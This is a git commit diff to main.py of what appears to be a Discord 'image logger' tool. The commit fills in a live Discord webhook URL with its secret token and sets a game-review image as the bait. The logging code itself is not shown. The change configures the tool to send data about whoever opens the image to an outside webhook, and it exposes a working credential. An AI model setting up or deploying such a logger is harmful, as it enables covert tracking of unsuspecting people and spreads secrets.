8e29f24664b76b11aa99f48747e8b3da17dc8741
Makaveli2314 <Lorenzogast6@gmail.com>
2025-05-25 15:11:05 +0200

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1376180441660395530/HGCRo3QNyysNEkMN3aFX6cvI0ToAym4w7KE1fQXK5G0LozsMgrv8pbNJb9AXLUw12c_c",
+    "image": "https://sm.ign.com/ign_de/review/m/marvels-sp/marvels-spider-man-2-review_rt58.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
